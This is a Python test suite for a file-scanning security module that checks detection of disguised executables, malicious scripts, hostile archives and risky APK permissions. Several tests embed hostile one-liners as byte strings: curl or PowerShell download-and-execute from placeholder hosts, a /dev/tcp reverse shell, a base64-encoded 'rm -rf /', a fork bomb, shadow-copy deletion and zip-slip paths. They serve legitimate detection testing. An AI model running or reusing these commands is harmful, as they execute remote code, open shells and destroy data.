"""File scanning: what a file IS, what it WOULD DO, and what AEGIS decides about it.

The scanner reads bytes. It never executes, never extracts to disk, never calls out.
These tests pin the behaviour that matters for that guarantee, and the clean-file
cases matter as much as the hostile ones - a scanner that flags everything is a
scanner nobody reads.
"""

from __future__ import annotations

import io
import zipfile

from app.security import filescan

PE_HEADER = b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 128
ELF_HEADER = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 128


def _zip(entries: dict[str, bytes], compress=zipfile.ZIP_STORED) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compress) as archive:
        for name, payload in entries.items():
            archive.writestr(name, payload)
    return buf.getvalue()


def _titles(result: dict) -> list[str]:
    return [f["title"] for f in result["findings"]]


# ------------------------------------------------------------------ identification

def test_executable_renamed_as_a_document_is_caught():
    result = filescan.scan("invoice.pdf", PE_HEADER)

    assert result["detected_type"] == "pe"
    assert "File type does not match its extension" in _titles(result)
    assert result["highest_severity"] == "CRITICAL"


def test_matching_extension_raises_no_mismatch():
    result = filescan.scan("setup.exe", PE_HEADER)

    assert "File type does not match its extension" not in _titles(result)
    # Still reported as executable - that is a fact about it, not an accusation.
    assert "File is an executable program" in _titles(result)


def test_double_extension_is_caught():
    result = filescan.scan("invoice.pdf.exe", PE_HEADER)

    assert "Double extension disguises an executable" in _titles(result)


def test_elf_is_identified():
    assert filescan.scan("payload.jpg", ELF_HEADER)["detected_type"] == "elf"


def test_sha256_is_recorded():
    result = filescan.scan("a.bin", b"hello")

    assert result["sha256"] == (
        "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824")


# ------------------------------------------------------------------- script behaviour

def test_curl_piped_into_shell_is_critical():
    result = filescan.scan("install.sh", b"#!/bin/sh\ncurl -s http://x.io/p | bash\n")

    assert "Downloads and executes remote code" in _titles(result)
    assert result["highest_severity"] == "CRITICAL"


def test_base64_piped_into_shell_is_critical():
    script = b"#!/bin/bash\necho cm0gLXJmIC8= | base64 -d | sh\n"

    assert "Executes base64-decoded commands" in _titles(filescan.scan("x.sh", script))


def test_reverse_shell_is_critical():
    script = b"#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"

    assert "Reverse shell" in _titles(filescan.scan("x.sh", script))


def test_fork_bomb_is_critical():
    assert "Fork bomb" in _titles(filescan.scan("x.sh", b":(){ :|:& };:\n"))


def test_shadow_copy_deletion_is_critical():
    script = b"vssadmin delete shadows /all /quiet\n"

    assert "Deletes Windows shadow copies" in _titles(filescan.scan("x.bat", script))


def test_powershell_download_and_execute_is_critical():
    script = b"IEX (New-Object Net.WebClient).DownloadString('http://x.io/a.ps1')\n"

    assert "PowerShell downloads and evaluates remote code" in _titles(
        filescan.scan("x.ps1", script))


def test_a_clean_deployment_script_produces_nothing():
    script = (b"#!/bin/bash\nset -euo pipefail\nnpm ci\nnpm test\n"
              b"docker build -t app:latest .\n")
    result = filescan.scan("deploy.sh", script)

    assert result["findings"] == []
    assert result["highest_severity"] == "NONE"


def test_the_word_curl_alone_is_not_a_finding():
    script = b"#!/bin/bash\ncurl -o app.tar.gz https://releases.example.com/app.tar.gz\n"

    assert filescan.scan("get.sh", script)["findings"] == []


# ------------------------------------------------------------------------- archives

def test_zip_slip_is_critical():
    data = _zip({"../../../etc/cron.d/x": b"* * * * * root sh"})
    result = filescan.scan("update.zip", data)

    assert "Archive entry escapes the extraction directory" in _titles(result)
    assert result["highest_severity"] == "CRITICAL"


def test_absolute_path_entry_is_caught():
    data = _zip({"/etc/passwd": b"root:x:0:0"})

    assert "Archive entry escapes the extraction directory" in _titles(
        filescan.scan("a.zip", data))


def test_zip_bomb_ratio_is_flagged():
    data = _zip({"big.txt": b"A" * (20 * 1024 * 1024)}, zipfile.ZIP_DEFLATED)

    assert "Extreme compression ratio" in _titles(filescan.scan("a.zip", data))


def test_an_ordinary_archive_is_not_flagged_as_a_bomb():
    data = _zip({"readme.txt": b"hello world " * 100}, zipfile.ZIP_DEFLATED)

    assert "Extreme compression ratio" not in _titles(filescan.scan("a.zip", data))


def test_document_carrying_an_executable_is_critical():
    data = _zip({"word/document.xml": b"<xml/>", "payload.exe": PE_HEADER})

    assert "Document carries an executable" in _titles(filescan.scan("report.docx", data))


def test_malformed_archive_is_reported_not_crashed():
    result = filescan.scan("broken.zip", b"PK\x03\x04" + b"\xff" * 200)

    assert "Archive is malformed" in _titles(result)


# ----------------------------------------------------------------------------- apk

def _apk(permissions: list[str], with_dex: bool = True) -> bytes:
    entries: dict[str, bytes] = {}
    if with_dex:
        entries["classes.dex"] = b"dex\n035\x00" + b"\x00" * 64
    manifest = " ".join("android.permission." + p for p in permissions)
    entries["AndroidManifest.xml"] = manifest.encode("utf-16-le")
    return _zip(entries)


def test_apk_permissions_are_reported():
    result = filescan.scan("app.apk", _apk(["SEND_SMS", "CAMERA"]))

    assert "Requests SEND_SMS" in _titles(result)
    assert "SEND_SMS" in result["facts"]["permissions"]


def test_surveillance_permission_set_is_critical():
    result = filescan.scan(
        "free-vpn.apk",
        _apk(["SEND_SMS", "READ_SMS", "RECORD_AUDIO", "BIND_ACCESSIBILITY_SERVICE"]))

    assert "Permission set matches a surveillance profile" in _titles(result)
    assert result["highest_severity"] == "CRITICAL"


def test_apk_without_a_manifest_is_high():
    data = _zip({"classes.dex": b"dex\n035\x00"})

    assert "Android package has no manifest" in _titles(filescan.scan("x.apk", data))


def test_a_modest_apk_is_not_called_surveillance():
    result = filescan.scan("notes.apk", _apk(["READ_EXTERNAL_STORAGE"]))

    assert "Permission set matches a surveillance profile" not in _titles(result)


# --------------------------------------------------------------------------- entropy

def test_entropy_of_uniform_bytes_is_zero():
    assert filescan.entropy(b"\x00" * 4096) == 0.0


def test_entropy_of_every_byte_is_maximal():
    assert filescan.entropy(bytes(range(256)) * 16) == 8.0


def test_packed_contents_in_a_declared_format_are_flagged():
    import os
    result = filescan.scan("report.pdf", b"%PDF" + os.urandom(200000))

    assert "Contents look packed or encrypted" in _titles(result)


def test_a_real_compressed_format_is_not_flagged_for_entropy():
    import os
    result = filescan.scan("photo.jpg", b"\xff\xd8\xff" + os.urandom(200000))

    assert "Contents look packed or encrypted" not in _titles(result)


# ----------------------------------------------------------------------- edge cases

def test_empty_file_is_handled():
    result = filescan.scan("nothing.txt", b"")

    assert result["detected_type"] == "empty"
    assert result["findings"][0]["severity"] == "LOW"


def test_no_extension_does_not_crash():
    assert filescan.scan("README", b"just text\n")["extension"] == ""


def test_findings_are_ordered_most_severe_first():
    script = b"#!/bin/bash\nchmod 777 /opt\ncurl http://x.io/p | sh\nhistory -c\n"
    severities = [f["severity"] for f in filescan.scan("x.sh", script)["findings"]]

    assert severities == sorted(severities, key=filescan.SEVERITIES.index)
